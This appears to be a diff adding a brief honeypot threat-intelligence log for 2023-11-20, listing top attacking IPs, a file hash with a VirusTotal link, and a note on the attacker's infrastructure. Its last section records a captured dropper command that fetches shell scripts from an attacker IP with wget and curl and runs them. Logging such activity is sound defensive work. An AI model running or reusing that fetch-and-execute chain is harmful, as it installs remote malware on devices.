@@ -1,0 +1,17 @@
+Top 5 IPs for 2023-11-20:
+103.178.153.224
+104.152.52.124
+157.245.101.71
+216.167.191.198
+174.138.32.6
+
+The below file is defuault 404 page so 0 detection and it is not malware.
+Malware download: ce7127c38e30e92a021ed2bd09287713c6a923db9ffdb43f126e8965d777fbf0 
+https://www.virustotal.com/gui/file/ce7127c38e30e92a021ed2bd09287713c6a923db9ffdb43f126e8965d777fbf0
+
+It seems attacker took down the infrastructure or making some changes to : http://103.116.105.27/wget.sh
+
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://103.116.105.27/w.sh; sh w.sh; curl http://103.116.105.27/c.sh; sh c.sh; wget http://103.116.105.27/wget.sh; sh wget.sh; curl http://103.116.105.27/wget.sh; sh wget.sh; busybox wget http://103.116.105.27/wget.sh; sh wget.sh; busybox curl http://103.116.105.27/wget.sh; sh wget.sh
+
